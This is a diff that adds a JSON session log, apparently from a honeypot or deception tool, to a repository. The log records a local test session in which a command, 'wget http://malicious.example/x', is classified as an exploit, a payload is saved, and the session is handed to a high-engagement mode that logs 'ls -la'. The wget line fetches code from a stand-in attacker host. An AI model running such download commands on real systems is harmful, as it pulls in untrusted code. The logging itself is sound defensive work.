@@ -1,0 +1,36 @@
+{
+  "session_id": "S-1762597591",
+  "src_ip": "127.0.0.1",
+  "src_port": 60336,
+  "events": [
+    {
+      "ts": 1762597591.1097333,
+      "text": "wget http://malicious.example/x"
+    },
+    {
+      "ts": 1762597591.1497934,
+      "text": "[CLASS]=exploit|0.9|ENG=HIGH"
+    },
+    {
+      "ts": 1762597591.1534998,
+      "text": "[PAYLOAD_SAVED]={'file': 'payload_handoff_1762597591.bin', 'path': 'C:\\\\project\\\\data\\\\sessions\\\\S-1762597591\\\\payload_handoff_1762597591.bin', 'sha256': 'ed0d381831c7e7c671ebf05d67cfad06d85a2a06922c225e9f256f7a2e950516', 'size': 26, 'saved_ts': 1762599530.9194348}"
+    },
+    {
+      "ts": 1762597591.1724372,
+      "text": "[ACTION]=HANDOFF_TO_HIGH_ENGAGEMENT"
+    },
+    {
+      "ts": 1762597591.2417018,
+      "text": "[HIGH_ENGAGEMENT]=START"
+    },
+    {
+      "ts": 1762597591.3623128,
+      "text": "ATTACKER_CMD: ls -la"
+    },
+    {
+      "ts": 1762597592.084039,
+      "text": "[HIGH_ENGAGEMENT]=END"
+    }
+  ],
+  "end_time": "Sat Nov  8 15:56:32 2025"
+}
